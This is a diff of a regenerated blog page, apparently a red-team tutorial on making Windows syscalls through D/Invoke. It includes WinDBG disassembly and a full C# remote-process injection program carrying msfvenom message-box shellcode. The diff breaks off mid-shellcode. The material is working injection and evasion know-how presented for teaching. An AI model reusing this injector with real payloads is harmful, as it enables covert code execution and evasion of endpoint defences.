@@ -3,7 +3,7 @@
   <head>
     <title>Syscalls with D/Invoke - Offensive Defence</title>
     <meta charset="utf-8" />
-    <meta name="generator" content="Hugo 0.82.0" />
+    <meta name="generator" content="Hugo 0.101.0" />
     <meta name="viewport" content="width=device-width, initial-scale=1" />
     <meta name="description" content="" />
     <link rel="stylesheet" href="https://offensivedefence.co.uk/css/main.min.f90f5edd436ec7b74ad05479a05705770306911f721193e7845948fb07fe1335.css" />
@@ -22,8 +22,8 @@ Image credit: Wikipedia
 Windows only supports Rings 0 and 3, affectionately known as Kernel and User Mode respectively. The majority of user activity will occur in Ring 3 but applications may cross into Ring 0 when calling a variety of APIs - this is required when accessing the filesystem for example." />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://offensivedefence.co.uk/posts/dinvoke-syscalls/" /><meta property="article:section" content="posts" />
-<meta property="article:published_time" content="2021-01-24T15:19:05&#43;00:00" />
-<meta property="article:modified_time" content="2021-01-24T15:19:05&#43;00:00" />
+<meta property="article:published_time" content="2021-01-24T15:19:05+00:00" />
+<meta property="article:modified_time" content="2021-01-24T15:19:05+00:00" />
 
 
 
@@ -87,763 +87,763 @@ Windows only supports Rings 0 and 3, affectionately known as Kernel and User Mod
 <p>So where do we go next?</p>
 <h3 id="syscalls">Syscalls</h3>
 <p>A system call (syscall) is the means by which <code>ntdll</code> transitions to the kernel.  We can &ldquo;unassemble&rdquo; NtOpenProcess in WinDBG easily enough to see the instructions.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">0:000&gt; u ntdll!NtOpenProcess
-ntdll!NtOpenProcess:
-00007ffd`8570c460 4c8bd1          mov     r10,rcx
-00007ffd`8570c463 b826000000      mov     eax,26h
-00007ffd`8570c468 f604250803fe7f01 test    byte ptr [SharedUserData+0x308 (00000000`7ffe0308)],1
-00007ffd`8570c470 7503            jne     ntdll!NtOpenProcess+0x15 (00007ffd`8570c475)
-00007ffd`8570c472 0f05            syscall
-00007ffd`8570c474 c3              ret
-00007ffd`8570c475 cd2e            int     2Eh
-00007ffd`8570c477 c3              ret
-</code></pre></div><p>There are also excellent <a href="https://j00ru.vexillium.org/">syscall lookup tables</a> that we can use as well.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>0:000&gt; u ntdll!NtOpenProcess
+</span></span><span style="display:flex;"><span>ntdll!NtOpenProcess:
+</span></span><span style="display:flex;"><span>00007ffd`8570c460 4c8bd1          mov     r10,rcx
+</span></span><span style="display:flex;"><span>00007ffd`8570c463 b826000000      mov     eax,26h
+</span></span><span style="display:flex;"><span>00007ffd`8570c468 f604250803fe7f01 test    byte ptr [SharedUserData+0x308 (00000000`7ffe0308)],1
+</span></span><span style="display:flex;"><span>00007ffd`8570c470 7503            jne     ntdll!NtOpenProcess+0x15 (00007ffd`8570c475)
+</span></span><span style="display:flex;"><span>00007ffd`8570c472 0f05            syscall
+</span></span><span style="display:flex;"><span>00007ffd`8570c474 c3              ret
+</span></span><span style="display:flex;"><span>00007ffd`8570c475 cd2e            int     2Eh
+</span></span><span style="display:flex;"><span>00007ffd`8570c477 c3              ret
+</span></span></code></pre></div><p>There are also excellent <a href="https://j00ru.vexillium.org/">syscall lookup tables</a> that we can use as well.</p>
 <p>D/Invoke has an excellent method called <code>GetSyscallStub</code> that will read <code>ntdll</code> from disk and find the syscall for a given API.  To demonstrate - this is the API trace of the typical OpenProcess/VirtualAllocEx/WriteProcessMemory/CreateRemoteThread (I&rsquo;ve blurred ones that are not directly related to the injection to preserve the clarity of the calls we want to focus on).</p>
 <p><img src="/images/dinvoke-syscalls/injection-trace.png" alt="" title="Original API Trace"></p>
 <p>This was tested with the following code:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#"><span style="color:#66d9ef">using</span> System;
-<span style="color:#66d9ef">using</span> System.Runtime.InteropServices;
-
-<span style="color:#66d9ef">namespace</span> ConsoleApp1
-{
-    <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Program</span>
-    {
-        <span style="color:#75715e">// msfvenom -p windows/x64/messagebox EXITFUNC=thread -f csharp
-</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">readonly</span> <span style="color:#66d9ef">byte</span>[] _shellcode = <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span>[<span style="color:#ae81ff">323</span>] {
-            <span style="color:#ae81ff">0</span>xfc,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x81,<span style="color:#ae81ff">0</span>xe4,<span style="color:#ae81ff">0</span>xf0,<span style="color:#ae81ff">0</span>xff,<span style="color:#ae81ff">0</span>xff,<span style="color:#ae81ff">0</span>xff,<span style="color:#ae81ff">0</span>xe8,<span style="color:#ae81ff">0</span>xd0,<span style="color:#ae81ff">0</span>x00,<span style="color:#ae81ff">0</span>x00,<span style="color:#ae81ff">0</span>x00,<span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>x51,
-            <span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>x50,<span style="color:#ae81ff">0</span>x52,<span style="color:#ae81ff">0</span>x51,<span style="color:#ae81ff">0</span>x56,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x31,<span style="color:#ae81ff">0</span>xd2,<span style="color:#ae81ff">0</span>x65,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x8b,<span style="color:#ae81ff">0</span>x52,<span style="color:#ae81ff">0</span>x60,<span style="color:#ae81ff">0</span>x3e,<span style="color:#ae81ff">0</span>x48,
-            <span style="color:#ae81ff">0</span>x8b,<span style="color:#ae81ff">0</span>x52,<span style="color:#ae81ff">0</span>x18,<span style="color:#ae81ff">0</span>x3e,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x8b,<span style="color:#ae81ff">0</span>x52,<span style="color:#ae81ff">0</span>x20,<span style="color:#ae81ff">0</span>x3e,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x8b,<span style="color:#ae81ff">0</span>x72,<span style="color:#ae81ff">0</span>x50,<span style="color:#ae81ff">0</span>x3e,<span style="color:#ae81ff">0</span>x48,
-            <span style="color:#ae81ff">0</span>x0f,<span style="color:#ae81ff">0</span>xb7,<span style="color:#ae81ff">0</span>x4a,<span style="color:#ae81ff">0</span>x4a,<span style="color:#ae81ff">0</span>x4d,<span style="color:#ae81ff">0</span>x31,<span style="color:#ae81ff">0</span>xc9,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x31,<span style="color:#ae81ff">0</span>xc0,<span style="color:#ae81ff">0</span>xac,<span style="color:#ae81ff">0</span>x3c,<span style="color:#ae81ff">0</span>x61,<span style="color:#ae81ff">0</span>x7c,<span style="color:#ae81ff">0</span>x02,
-            <span style="color:#ae81ff">0</span>x2c,<span style="color:#ae81ff">0</span>x20,<span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>xc1,<span style="color:#ae81ff">0</span>xc9,<span style="color:#ae81ff">0</span>x0d,<span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>x01,<span style="color:#ae81ff">0</span>xc1,<span style="color:#ae81ff">0</span>xe2,<span style="color:#ae81ff">0</span>xed,<span style="color:#ae81ff">0</span>x52,<span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>x51,<span style="color:#ae81ff">0</span>x3e,
-            <span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x8b,<span style="color:#ae81ff">0</span>x52,<span style="color:#ae81ff">0</span>x20,<span style="color:#ae81ff">0</span>x3e,<span style="color:#ae81ff">0</span>x8b,<span style="color:#ae81ff">0</span>x42,<span style="color:#ae81ff">0</span>x3c,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x01,<span style="color:#ae81ff">0</span>xd0,<span style="color:#ae81ff">0</span>x3e,<span style="color:#ae81ff">0</span>x8b,<span style="color:#ae81ff">0</span>x80,<span style="color:#ae81ff">0</span>x88,
-            <span style="color:#ae81ff">0</span>x00,<span style="color:#ae81ff">0</span>x00,<span style="color:#ae81ff">0</span>x00,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x85,<span style="color:#ae81ff">0</span>xc0,<span style="color:#ae81ff">0</span>x74,<span style="color:#ae81ff">0</span>x6f,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x01,<span style="color:#ae81ff">0</span>xd0,<span style="color:#ae81ff">0</span>x50,<span style="color:#ae81ff">0</span>x3e,<span style="color:#ae81ff">0</span>x8b,<span style="color:#ae81ff">0</span>x48,
-            <span style="color:#ae81ff">0</span>x18,<span style="color:#ae81ff">0</span>x3e,<span style="color:#ae81ff">0</span>x44,<span style="color:#ae81ff">0</span>x8b,<span style="color:#ae81ff">0</span>x40,<span style="color:#ae81ff">0</span>x20,<span style="color:#ae81ff">0</span>x49,<span style="color:#ae81ff">0</span>x01,<span style="color:#ae81ff">0</span>xd0,<span style="color:#ae81ff">0</span>xe3,<span style="color:#ae81ff">0</span>x5c,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>xff,<span style="color:#ae81ff">0</span>xc9,<span style="color:#ae81ff">0</span>x3e,
-            <span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>x8b,<span style="color:#ae81ff">0</span>x34,<span style="color:#ae81ff">0</span>x88,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x01,<span style="color:#ae81ff">0</span>xd6,<span style="color:#ae81ff">0</span>x4d,<span style="color:#ae81ff">0</span>x31,<span style="color:#ae81ff">0</span>xc9,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x31,<span style="color:#ae81ff">0</span>xc0,<span style="color:#ae81ff">0</span>xac,<span style="color:#ae81ff">0</span>x41,
-            <span style="color:#ae81ff">0</span>xc1,<span style="color:#ae81ff">0</span>xc9,<span style="color:#ae81ff">0</span>x0d,<span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>x01,<span style="color:#ae81ff">0</span>xc1,<span style="color:#ae81ff">0</span>x38,<span style="color:#ae81ff">0</span>xe0,<span style="color:#ae81ff">0</span>x75,<span style="color:#ae81ff">0</span>xf1,<span style="color:#ae81ff">0</span>x3e,<span style="color:#ae81ff">0</span>x4c,<span style="color:#ae81ff">0</span>x03,<span style="color:#ae81ff">0</span>x4c,<span style="color:#ae81ff">0</span>x24,
-            <span style="color:#ae81ff">0</span>x08,<span style="color:#ae81ff">0</span>x45,<span style="color:#ae81ff">0</span>x39,<span style="color:#ae81ff">0</span>xd1,<span style="color:#ae81ff">0</span>x75,<span style="color:#ae81ff">0</span>xd6,<span style="color:#ae81ff">0</span>x58,<span style="color:#ae81ff">0</span>x3e,<span style="color:#ae81ff">0</span>x44,<span style="color:#ae81ff">0</span>x8b,<span style="color:#ae81ff">0</span>x40,<span style="color:#ae81ff">0</span>x24,<span style="color:#ae81ff">0</span>x49,<span style="color:#ae81ff">0</span>x01,<span style="color:#ae81ff">0</span>xd0,
-            <span style="color:#ae81ff">0</span>x66,<span style="color:#ae81ff">0</span>x3e,<span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>x8b,<span style="color:#ae81ff">0</span>x0c,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x3e,<span style="color:#ae81ff">0</span>x44,<span style="color:#ae81ff">0</span>x8b,<span style="color:#ae81ff">0</span>x40,<span style="color:#ae81ff">0</span>x1c,<span style="color:#ae81ff">0</span>x49,<span style="color:#ae81ff">0</span>x01,<span style="color:#ae81ff">0</span>xd0,<span style="color:#ae81ff">0</span>x3e,
-            <span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>x8b,<span style="color:#ae81ff">0</span>x04,<span style="color:#ae81ff">0</span>x88,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x01,<span style="color:#ae81ff">0</span>xd0,<span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>x58,<span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>x58,<span style="color:#ae81ff">0</span>x5e,<span style="color:#ae81ff">0</span>x59,<span style="color:#ae81ff">0</span>x5a,<span style="color:#ae81ff">0</span>x41,
-            <span style="color:#ae81ff">0</span>x58,<span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>x59,<span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>x5a,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x83,<span style="color:#ae81ff">0</span>xec,<span style="color:#ae81ff">0</span>x20,<span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>x52,<span style="color:#ae81ff">0</span>xff,<span style="color:#ae81ff">0</span>xe0,<span style="color:#ae81ff">0</span>x58,<span style="color:#ae81ff">0</span>x41,
-            <span style="color:#ae81ff">0</span>x59,<span style="color:#ae81ff">0</span>x5a,<span style="color:#ae81ff">0</span>x3e,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x8b,<span style="color:#ae81ff">0</span>x12,<span style="color:#ae81ff">0</span>xe9,<span style="color:#ae81ff">0</span>x49,<span style="color:#ae81ff">0</span>xff,<span style="color:#ae81ff">0</span>xff,<span style="color:#ae81ff">0</span>xff,<span style="color:#ae81ff">0</span>x5d,<span style="color:#ae81ff">0</span>x49,<span style="color:#ae81ff">0</span>xc7,<span style="color:#ae81ff">0</span>xc1,
-            <span style="color:#ae81ff">0</span>x00,<span style="color:#ae81ff">0</span>x00,<span style="color:#ae81ff">0</span>x00,<span style="color:#ae81ff">0</span>x00,<span style="color:#ae81ff">0</span>x3e,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x8d,<span style="color:#ae81ff">0</span>x95,<span style="color:#ae81ff">0</span>x1a,<span style="color:#ae81ff">0</span>x01,<span style="color:#ae81ff">0</span>x00,<span style="color:#ae81ff">0</span>x00,<span style="color:#ae81ff">0</span>x3e,<span style="color:#ae81ff">0</span>x4c,<span style="color:#ae81ff">0</span>x8d,
-            <span style="color:#ae81ff">0</span>x85,<span style="color:#ae81ff">0</span>x2b,<span style="color:#ae81ff">0</span>x01,<span style="color:#ae81ff">0</span>x00,<span style="color:#ae81ff">0</span>x00,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x31,<span style="color:#ae81ff">0</span>xc9,<span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>xba,<span style="color:#ae81ff">0</span>x45,<span style="color:#ae81ff">0</span>x83,<span style="color:#ae81ff">0</span>x56,<span style="color:#ae81ff">0</span>x07,<span style="color:#ae81ff">0</span>xff,
-            <span style="color:#ae81ff">0</span>xd5,<span style="color:#ae81ff">0</span>xbb,<span style="color:#ae81ff">0</span>xe0,<span style="color:#ae81ff">0</span>x1d,<span style="color:#ae81ff">0</span>x2a,<span style="color:#ae81ff">0</span>x0a,<span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>xba,<span style="color:#ae81ff">0</span>xa6,<span style="color:#ae81ff">0</span>x95,<span style="color:#ae81ff">0</span>xbd,<span style="color:#ae81ff">0</span>x9d,<span style="color:#ae81ff">0</span>xff,<span style="color:#ae81ff">0</span>xd5,<span style="color:#ae81ff">0</span>x48,
-            <span style="color:#ae81ff">0</span>x83,<span style="color:#ae81ff">0</span>xc4,<span style="color:#ae81ff">0</span>x28,<span style="color:#ae81ff">0</span>x3c,<span style="color:#ae81ff">0</span>x06,<span style="color:#ae81ff">0</span>x7c,<span style="color:#ae81ff">0</span>x0a,<span style="color:#ae81ff">0</span>x80,<span style="color:#ae81ff">0</span>xfb,<span style="color:#ae81ff">0</span>xe0,<span style="color:#ae81ff">0</span>x75,<span style="color:#ae81ff">0</span>x05,<span style="color:#ae81ff">0</span>xbb,<span style="color:#ae81ff">0</span>x47,<span style="color:#ae81ff">0</span>x13,
-            <span style="color:#ae81ff">0</span>x72,<span style="color:#ae81ff">0</span>x6f,<span style="color:#ae81ff">0</span>x6a,<span style="color:#ae81ff">0</span>x00,<span style="color:#ae81ff">0</span>x59,<span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>x89,<span style="color:#ae81ff">0</span>xda,<span style="color:#ae81ff">0</span>xff,<span style="color:#ae81ff">0</span>xd5,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x65,<span style="color:#ae81ff">0</span>x6c,<span style="color:#ae81ff">0</span>x6c,<span style="color:#ae81ff">0</span>x6f,
-            <span style="color:#ae81ff">0</span>x2c,<span style="color:#ae81ff">0</span>x20,<span style="color:#ae81ff">0</span>x66,<span style="color:#ae81ff">0</span>x72,<span style="color:#ae81ff">0</span>x6f,<span style="color:#ae81ff">0</span>x6d,<span style="color:#ae81ff">0</span>x20,<span style="color:#ae81ff">0</span>x4d,<span style="color:#ae81ff">0</span>x53,<span style="color:#ae81ff">0</span>x46,<span style="color:#ae81ff">0</span>x21,<span style="color:#ae81ff">0</span>x00,<span style="color:#ae81ff">0</span>x4d,<span style="color:#ae81ff">0</span>x65,<span style="color:#ae81ff">0</span>x73,
-            <span style="color:#ae81ff">0</span>x73,<span style="color:#ae81ff">0</span>x61,<span style="color:#ae81ff">0</span>x67,<span style="color:#ae81ff">0</span>x65,<span style="color:#ae81ff">0</span>x42,<span style="color:#ae81ff">0</span>x6f,<span style="color:#ae81ff">0</span>x78,<span style="color:#ae81ff">0</span>x00 };
-
-    <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> Main(<span style="color:#66d9ef">string</span>[] args)
-        {
-            <span style="color:#66d9ef">var</span> hProcess = OpenProcess(
-                <span style="color:#ae81ff">0</span>x001F0FFF,
-                <span style="color:#66d9ef">false</span>,
-                <span style="color:#66d9ef">int</span>.Parse(args[<span style="color:#ae81ff">0</span>]));
-
-            <span style="color:#66d9ef">var</span> hRegion = VirtualAllocEx(
-                hProcess,
-                IntPtr.Zero,
-                (<span style="color:#66d9ef">uint</span>)_shellcode.Length,
-                <span style="color:#ae81ff">0</span>x1000 | <span style="color:#ae81ff">0</span>x2000,
-                <span style="color:#ae81ff">0</span>x04); <span style="color:#75715e">// PAGE_READWRITE
-</span><span style="color:#75715e"></span>
-            WriteProcessMemory(
-                hProcess,
-                hRegion,
-                _shellcode,
-                (<span style="color:#66d9ef">uint</span>)_shellcode.Length,
-                <span style="color:#66d9ef">out</span> UIntPtr _);
-
-            VirtualProtectEx(
-                hProcess,
-                hRegion,
-                (UIntPtr)_shellcode.Length,
-                <span style="color:#ae81ff">0</span>x20,  <span style="color:#75715e">// PAGE_EXECUTE_READ
-</span><span style="color:#75715e"></span>                <span style="color:#66d9ef">out</span> <span style="color:#66d9ef">uint</span> _);
-
-            CreateRemoteThread(
-                hProcess,
-                IntPtr.Zero,
-                <span style="color:#ae81ff">0</span>,
-                hRegion,
-                IntPtr.Zero,
-                <span style="color:#ae81ff">0</span>,
-                IntPtr.Zero);
-        }
-<span style="color:#a6e22e">
-</span><span style="color:#a6e22e">        [DllImport(&#34;kernel32.dll&#34;)]</span>
-        <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">extern</span> IntPtr OpenProcess(
-            <span style="color:#66d9ef">int</span> dwDesiredAccess,
-            <span style="color:#66d9ef">bool</span> bInheritHandle,
-            <span style="color:#66d9ef">int</span> dwProcessId);
-<span style="color:#a6e22e">
-</span><span style="color:#a6e22e">        [DllImport(&#34;kernel32.dll&#34;)]</span>
-        <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">extern</span> IntPtr VirtualAllocEx(
-            IntPtr hProcess,
-            IntPtr lpAddress,
-            <span style="color:#66d9ef">uint</span> dwSize,
-            <span style="color:#66d9ef">uint</span> flAllocationType,
-            <span style="color:#66d9ef">uint</span> flProtect);
-<span style="color:#a6e22e">
-</span><span style="color:#a6e22e">        [DllImport(&#34;kernel32.dll&#34;)]</span>
-        <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">extern</span> <span style="color:#66d9ef">bool</span> WriteProcessMemory(
-            IntPtr hProcess,
-            IntPtr lpBaseAddress,
-            <span style="color:#66d9ef">byte</span>[] lpBuffer,
-            <span style="color:#66d9ef">uint</span> nSize,
-            <span style="color:#66d9ef">out</span> UIntPtr lpNumberOfBytesWritten);
-<span style="color:#a6e22e">
-</span><span style="color:#a6e22e">        [DllImport(&#34;kernel32.dll&#34;)]</span>
-        <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">extern</span> <span style="color:#66d9ef">bool</span> VirtualProtectEx(
-            IntPtr hProcess,
-            IntPtr lpAddress,
-            UIntPtr dwSize,
-            <span style="color:#66d9ef">uint</span> flNewProtect,
-            <span style="color:#66d9ef">out</span> <span style="color:#66d9ef">uint</span> lpflOldProtect);
-<span style="color:#a6e22e">
-</span><span style="color:#a6e22e">        [DllImport(&#34;kernel32.dll&#34;)]</span>
-        <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">extern</span> IntPtr CreateRemoteThread(
-            IntPtr hProcess,
-            IntPtr lpThreadAttributes,
-            <span style="color:#66d9ef">uint</span> dwStackSize,
-            IntPtr lpStartAddress,
-            IntPtr lpParameter,
-            <span style="color:#66d9ef">uint</span> dwCreationFlags, IntPtr lpThreadId);
-    }
-}
-</code></pre></div><p>We shall now replace the standard P/Invoke with syscalls for each of these APIs.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c#" data-lang="c#"><span style="display:flex;"><span><span style="color:#66d9ef">using</span> System;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">using</span> System.Runtime.InteropServices;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">namespace</span> ConsoleApp1
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Program</span>
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// msfvenom -p windows/x64/messagebox EXITFUNC=thread -f csharp</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">readonly</span> <span style="color:#66d9ef">byte</span>[] _shellcode = <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span>[<span style="color:#ae81ff">323</span>] {
+</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">0xfc</span>,<span style="color:#ae81ff">0x48</span>,<span style="color:#ae81ff">0x81</span>,<span style="color:#ae81ff">0xe4</span>,<span style="color:#ae81ff">0xf0</span>,<span style="color:#ae81ff">0xff</span>,<span style="color:#ae81ff">0xff</span>,<span style="color:#ae81ff">0xff</span>,<span style="color:#ae81ff">0xe8</span>,<span style="color:#ae81ff">0xd0</span>,<span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x41</span>,<span style="color:#ae81ff">0x51</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">0x41</span>,<span style="color:#ae81ff">0x50</span>,<span style="color:#ae81ff">0x52</span>,<span style="color:#ae81ff">0x51</span>,<span style="color:#ae81ff">0x56</span>,<span style="color:#ae81ff">0x48</span>,<span style="color:#ae81ff">0x31</span>,<span style="color:#ae81ff">0xd2</span>,<span style="color:#ae81ff">0x65</span>,<span style="color:#ae81ff">0x48</span>,<span style="color:#ae81ff">0x8b</span>,<span style="color:#ae81ff">0x52</span>,<span style="color:#ae81ff">0x60</span>,<span style="color:#ae81ff">0x3e</span>,<span style="color:#ae81ff">0x48</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">0x8b</span>,<span style="color:#ae81ff">0x52</span>,<span style="color:#ae81ff">0x18</span>,<span style="color:#ae81ff">0x3e</span>,<span style="color:#ae81ff">0x48</span>,<span style="color:#ae81ff">0x8b</span>,<span style="color:#ae81ff">0x52</span>,<span style="color:#ae81ff">0x20</span>,<span style="color:#ae81ff">0x3e</span>,<span style="color:#ae81ff">0x48</span>,<span style="color:#ae81ff">0x8b</span>,<span style="color:#ae81ff">0x72</span>,<span style="color:#ae81ff">0x50</span>,<span style="color:#ae81ff">0x3e</span>,<span style="color:#ae81ff">0x48</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">0x0f</span>,<span style="color:#ae81ff">0xb7</span>,<span style="color:#ae81ff">0x4a</span>,<span style="color:#ae81ff">0x4a</span>,<span style="color:#ae81ff">0x4d</span>,<span style="color:#ae81ff">0x31</span>,<span style="color:#ae81ff">0xc9</span>,<span style="color:#ae81ff">0x48</span>,<span style="color:#ae81ff">0x31</span>,<span style="color:#ae81ff">0xc0</span>,<span style="color:#ae81ff">0xac</span>,<span style="color:#ae81ff">0x3c</span>,<span style="color:#ae81ff">0x61</span>,<span style="color:#ae81ff">0x7c</span>,<span style="color:#ae81ff">0x02</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">0x2c</span>,<span style="color:#ae81ff">0x20</span>,<span style="color:#ae81ff">0x41</span>,<span style="color:#ae81ff">0xc1</span>,<span style="color:#ae81ff">0xc9</span>,<span style="color:#ae81ff">0x0d</span>,<span style="color:#ae81ff">0x41</span>,<span style="color:#ae81ff">0x01</span>,<span style="color:#ae81ff">0xc1</span>,<span style="color:#ae81ff">0xe2</span>,<span style="color:#ae81ff">0xed</span>,<span style="color:#ae81ff">0x52</span>,<span style="color:#ae81ff">0x41</span>,<span style="color:#ae81ff">0x51</span>,<span style="color:#ae81ff">0x3e</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">0x48</span>,<span style="color:#ae81ff">0x8b</span>,<span style="color:#ae81ff">0x52</span>,<span style="color:#ae81ff">0x20</span>,<span style="color:#ae81ff">0x3e</span>,<span style="color:#ae81ff">0x8b</span>,<span style="color:#ae81ff">0x42</span>,<span style="color:#ae81ff">0x3c</span>,<span style="color:#ae81ff">0x48</span>,<span style="color:#ae81ff">0x01</span>,<span style="color:#ae81ff">0xd0</span>,<span style="color:#ae81ff">0x3e</span>,<span style="color:#ae81ff">0x8b</span>,<span style="color:#ae81ff">0x80</span>,<span style="color:#ae81ff">0x88</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x48</span>,<span style="color:#ae81ff">0x85</span>,<span style="color:#ae81ff">0xc0</span>,<span style="color:#ae81ff">0x74</span>,<span style="color:#ae81ff">0x6f</span>,<span style="color:#ae81ff">0x48</span>,<span style="color:#ae81ff">0x01</span>,<span style="color:#ae81ff">0xd0</span>,<span style="color:#ae81ff">0x50</span>,<span style="color:#ae81ff">0x3e</span>,<span style="color:#ae81ff">0x8b</span>,<span style="color:#ae81ff">0x48</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">0x18</span>,<span style="color:#ae81ff">0x3e</span>,<span style="color:#ae81ff">0x44</span>,<span style="color:#ae81ff">0x8b</span>,<span style="color:#ae81ff">0x40</span>,<span style="color:#ae81ff">0x20</span>,<span style="color:#ae81ff">0x49</span>,<span style="color:#ae81ff">0x01</span>,<span style="color:#ae81ff">0xd0</span>,<span style="color:#ae81ff">0xe3</span>,<span style="color:#ae81ff">0x5c</span>,<span style="color:#ae81ff">0x48</span>,<span style="color:#ae81ff">0xff</span>,<span style="color:#ae81ff">0xc9</span>,<span style="color:#ae81ff">0x3e</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">0x41</span>,<span style="color:#ae81ff">0x8b</span>,<span style="color:#ae81ff">0x34</span>,<span style="color:#ae81ff">0x88</span>,<span style="color:#ae81ff">0x48</span>,<span style="color:#ae81ff">0x01</span>,<span style="color:#ae81ff">0xd6</span>,<span style="color:#ae81ff">0x4d</span>,<span style="color:#ae81ff">0x31</span>,<span style="color:#ae81ff">0xc9</span>,<span style="color:#ae81ff">0x48</span>,<span style="color:#ae81ff">0x31</span>,<span style="color:#ae81ff">0xc0</span>,<span style="color:#ae81ff">0xac</span>,<span style="color:#ae81ff">0x41</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">0xc1</span>,<span style="color:#ae81ff">0xc9</span>,<span style="color:#ae81ff">0x0d</span>,<span style="color:#ae81ff">0x41</span>,<span style="color:#ae81ff">0x01</span>,<span style="color:#ae81ff">0xc1</span>,<span style="color:#ae81ff">0x38</span>,<span style="color:#ae81ff">0xe0</span>,<span style="color:#ae81ff">0x75</span>,<span style="color:#ae81ff">0xf1</span>,<span style="color:#ae81ff">0x3e</span>,<span style="color:#ae81ff">0x4c</span>,<span style="color:#ae81ff">0x03</span>,<span style="color:#ae81ff">0x4c</span>,<span style="color:#ae81ff">0x24</span>,
